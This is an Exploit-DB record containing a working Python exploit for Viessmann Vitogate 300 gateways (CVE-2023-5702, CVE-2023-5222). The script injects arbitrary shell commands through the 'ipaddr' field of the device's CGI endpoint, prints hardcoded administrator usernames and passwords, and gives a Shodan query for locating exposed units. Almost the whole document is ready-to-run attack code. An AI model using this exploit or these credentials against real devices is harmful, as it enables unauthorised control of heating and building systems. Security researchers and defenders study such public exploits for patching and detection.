{"source": "https://www.exploit-db.com/exploits/51887", "vulnName": "Viessmann Vitogate 300 2.1.3.0 - Remote Code Execution (RCE)", "vulnEDBID": "51887", "vulnCVE": "2023-5702 2023-5222", "author": "BYTEHUNTER", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-14", "vulnContent": "#- Exploit Title: Viessmann Vitogate 300 <= 2.1.3.0 - Remote Code Execution (RCE)\n#- Shodan Dork: http.title:'Vitogate 300'\n#- Exploit Author: ByteHunter\n#- Email: 0xByteHunter@proton.me\n#- Version: versions up to 2.1.3.0\n#- Tested on: 2.1.1.0\n#- CVE : CVE-2023-5702 & CVE-2023-5222\n\n\nimport argparse\nimport requests\n\ndef banner():\n    banner = \"\"\"\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n             CVE-2023-5702   \n           Vitogate 300 RCE\n           Author: ByteHunter      \n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n    \"\"\"\n\n    print(banner)\n\n\ndef send_post_request(target_ip, command, target_port):\n    payload = {\n        \"method\": \"put\",\n        \"form\": \"form-4-7\",\n        \"session\": \"\",\n        \"params\": {\n            \"ipaddr\": f\"1;{command}\"\n        }\n    }\n\n    headers = {\n        \"Host\": target_ip,\n        \"Content-Length\": str(len(str(payload))),\n        \"Content-Type\": \"application/json\"\n    }\n\n    url = f\"http://{target_ip}:{target_port}/cgi-bin/vitogate.cgi\"\n\n\n    response = requests.post(url, json=payload, headers=headers)\n\n    if response.status_code == 200:\n        print(\"Result:\")\n        print(response.text)\n    else:\n        print(f\"Request failed! status code: {response.status_code}\")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Vitogate 300 RCE & Hardcoded Credentials\")\n    parser.add_argument(\"--target\", required=False, help=\"Target IP address\")\n    parser.add_argument(\"--port\", required=False, help=\"Target port\",default=\"80\")\n    parser.add_argument(\"--command\", required=False, help=\"Command\")\n    parser.add_argument(\"--creds\", action=\"store_true\", help=\"Show hardcoded credentials\")\n\n    args = parser.parse_args()\n\n    if args.creds:\n        print(\"Vitogate 300 hardcoded administrative accounts credentials\")\n        print(\"Username: vitomaster, Password: viessmann1917\")\n        print(\"Username: vitogate, Password: viessmann\")\n    else:\n        target_ip = args.target\n        target_port = args.port\n        command = args.command\n\n        if not (target_ip and command):\n            print(\"Both --target and --command options are required.\\nor use --creds option to see hardcoded Credentials.\")\n            return\n\n        send_post_request(target_ip, command,target_port)\n\nif __name__ == \"__main__\":\n    banner()\n    main()\n            "}